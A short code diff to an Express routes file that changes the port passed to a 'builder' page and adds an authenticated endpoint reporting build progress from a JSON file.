@@ -65,7 +65,7 @@ routes.get('/logout', isAllowed, (req, res) => {
 
 routes.get('/builder', isAllowed, (req, res) => {
     res.render('builder', {
-        myPort: config.control_port
+        myPort: config.web_port
     });
 });
 
@@ -89,6 +89,22 @@ routes.post('/builder', isAllowed, (req, res) => {
     else {
         logManager.log(config.logTypes.error, "Build Failed - " + error);
         res.json({ error });
+    }
+});
+
+// Build progress endpoint for UI polling
+routes.get('/builder/progress', isAllowed, (req, res) => {
+    try {
+        const fs = require('fs');
+        const progressFile = config.buildProgressFile;
+        if (fs.existsSync(progressFile)) {
+            const json = JSON.parse(fs.readFileSync(progressFile, 'utf8'));
+            res.json({ error: false, progress: json });
+        } else {
+            res.json({ error: false, progress: { step: 'idle', message: 'Idle', complete: false } });
+        }
+    } catch (e) {
+        res.json({ error: 'Unable to read progress' });
     }
 });
 
